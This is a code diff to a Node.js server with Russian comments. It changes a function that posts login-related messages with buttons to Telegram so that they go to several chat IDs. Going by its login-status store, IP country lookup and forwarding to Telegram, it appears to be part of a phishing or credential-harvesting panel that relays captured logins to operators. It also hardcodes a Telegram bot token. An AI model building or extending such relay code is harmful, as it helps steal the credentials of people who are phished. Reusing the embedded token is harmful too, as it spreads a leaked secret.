@@ -16,7 +16,8 @@ const { exec } = require('child_process');
 // Получаем конфигурацию из переменных окружения или используем значения по умолчанию
 const PORT = process.env.PORT || 8000;
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8456537851:AAFvHrQJqgIFwhdr7PSaxBEkSTJ8eZaTv0Q';
-const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '5257327001';
+// Поддержка нескольких Chat ID через запятую
+const TELEGRAM_CHAT_IDS = (process.env.TELEGRAM_CHAT_IDS || process.env.TELEGRAM_CHAT_ID || '5257327001').split(',').map(id => id.trim());
 const NODE_ENV = process.env.NODE_ENV || 'development';
 
 // Хранилище статусов логинов
@@ -42,12 +43,12 @@ const mimeTypes = {
     '.wasm': 'application/wasm'
 };
 
-// Функция для отправки сообщения в Telegram с кнопками
-function sendToTelegram(message, loginId, callback) {
+// Функция для отправки сообщения в один чат Telegram
+function sendToTelegramChat(chatId, message, loginId, callback) {
     const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
     
     const messageData = {
-        chat_id: TELEGRAM_CHAT_ID,
+        chat_id: chatId,
         text: message,
         parse_mode: 'HTML'
     };
@@ -93,6 +94,43 @@ function sendToTelegram(message, loginId, callback) {
 
     req.write(postData);
     req.end();
+}
+
+// Функция для отправки сообщения в несколько чатов Telegram
+function sendToTelegram(message, loginId, callback) {
+    let completed = 0;
+    let errors = [];
+    const totalChats = TELEGRAM_CHAT_IDS.length;
+    
+    // Если нет чатов, возвращаем ошибку
+    if (totalChats === 0) {
+        callback(new Error('No Telegram chat IDs configured'), null);
+        return;
+    }
+    
+    // Отправляем сообщение в каждый чат
+    TELEGRAM_CHAT_IDS.forEach((chatId, index) => {
+        sendToTelegramChat(chatId, message, loginId, (error, result) => {
+            completed++;
+            if (error) {
+                errors.push({ chatId, error: error.message });
+            }
+            
+            // Вызываем callback когда все сообщения отправлены
+            if (completed === totalChats) {
+                if (errors.length === 0) {
+                    // Все успешно отправлено
+                    callback(null, { ok: true, sentTo: totalChats });
+                } else if (errors.length < totalChats) {
+                    // Частично успешно
+                    callback(null, { ok: true, sentTo: totalChats - errors.length, errors: errors });
+                } else {
+                    // Все провалились
+                    callback(new Error(`Failed to send to all chats: ${errors.map(e => e.error).join(', ')}`), null);
+                }
+            }
+        });
+    });
 }
 
 // Функция для получения информации о стране по IP
